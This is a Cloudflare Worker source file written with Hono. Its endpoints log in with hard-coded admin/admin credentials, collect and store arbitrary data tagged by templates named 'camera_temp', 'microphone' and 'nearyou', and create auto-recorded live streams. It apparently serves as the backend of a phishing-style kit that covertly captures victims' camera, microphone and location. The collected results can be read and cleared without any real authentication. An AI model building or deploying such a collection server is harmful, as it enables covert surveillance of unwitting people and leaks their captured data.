import { Hono } from 'hono';
import { RealtimeKitAPI } from '@cloudflare/realtimekit';

const app = new Hono();

// --- Authentication ---
const USERS = {
  admin: 'admin',
};

app.post('/api/login', async (c) => {
  const { username, password } = await c.req.json();
  if (USERS[username] === password) {
    return c.json({ success: true, token: 'dummy-token' });
  }
  return c.json({ success: false }, 401);
});

// --- General Data Collection ---
app.get('/api/results', async (c) => {
  const results = await c.env.KV.get('results');
  return c.text(results || '');
});

app.post('/api/clear', async (c) => {
  await c.env.KV.put('results', '');
  return c.json({ success: true });
});

app.post('/api/collect', async (c) => {
  const { template, data } = await c.req.json();
  const key = `results`;
  const existingData = await c.env.KV.get(key);
  const newData = `${existingData || ''}\n[${template}] ${JSON.stringify(data)}`;
  await c.env.KV.put(key, newData);
  return c.text('Data collected');
});

// --- Template Listing ---
app.get('/api/templates', (c) => {
  const templates = [
    "camera_temp",
    "microphone",
    "nearyou",
    "normal_data",
    "weather",
  ];
  return c.json(templates);
});

// --- Real-time Meeting (Streaming) ---
const ACTIVE_MEETING_KEY = 'active_meeting_id';

app.post('/api/meetings', async (c) => {
  const { title } = await c.req.json();

  const realtime = new RealtimeKitAPI(c.env.REALTIMEKIT_API_KEY, {
    realtimeKitOrgId: c.env.REALTIMEKIT_ORG_ID,
  });

  try {
    let meetingId = await c.env.KV.get(ACTIVE_MEETING_KEY);

    if (!meetingId) {
      console.log('No active meeting found, creating a new one.');
      const meeting = await realtime.createMeeting({
        title: title || 'Live Stream',
        recordOnStart: true,
      });
      meetingId = meeting.id;
      await c.env.KV.put(ACTIVE_MEETING_KEY, meetingId);
    } else {
      console.log(`Found active meeting: ${meetingId}`);
    }

    const participant = await realtime.addParticipant(meetingId, {
      name: 'Viewer',
      presetName: 'group_call_participant',
      customParticipantId: 'viewer-' + Math.random().toString(36).substring(7),
    });

    return c.json({
      meetingId: meetingId,
      authToken: participant.token,
    });
  } catch (error) {
    console.error(error);
    return c.json({ success: false, error: 'Failed to create or join meeting' }, 500);
  }
});

app.post('/api/meetings/end', async (c) => {
  await c.env.KV.delete(ACTIVE_MEETING_KEY);
  return c.json({ success: true, message: 'Active meeting ended.' });
});

export default app;
